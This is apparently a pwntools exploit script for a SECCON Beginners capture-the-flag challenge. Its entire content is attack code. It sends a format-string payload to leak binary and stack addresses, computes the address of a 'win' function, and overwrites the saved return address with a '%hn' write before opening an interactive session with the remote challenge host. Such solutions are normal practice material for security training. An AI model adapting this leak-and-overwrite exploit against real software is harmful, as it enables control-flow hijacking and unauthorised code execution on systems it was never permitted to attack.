#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("forgot-some-exploit.beginners.seccon.games", 9002)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *echo+74
		b *echo+127
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

# local
#payload = b'%41$p%13$p'
# remote
payload = b'%41$p%40$p'

p.send(payload)

leak = eval(p.recv(14))
log.info("bin leak: " + hex(leak))
bin_base = leak - 0x12ec
elf.address = bin_base
log.info("bin base: " + hex(bin_base))
win = elf.symbols["win"]
log.info("win: " + hex(win))
leak = eval(p.recv(14))
log.info("stack leak: " + hex(leak))
ret_addr = leak - 0x8
log.info("return address@" + hex(ret_addr))

payload = "%{}c%8$hn".format(win+1&0xffff).encode()
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(ret_addr)

sleep(0.3)
p.send(payload)

p.interactive()
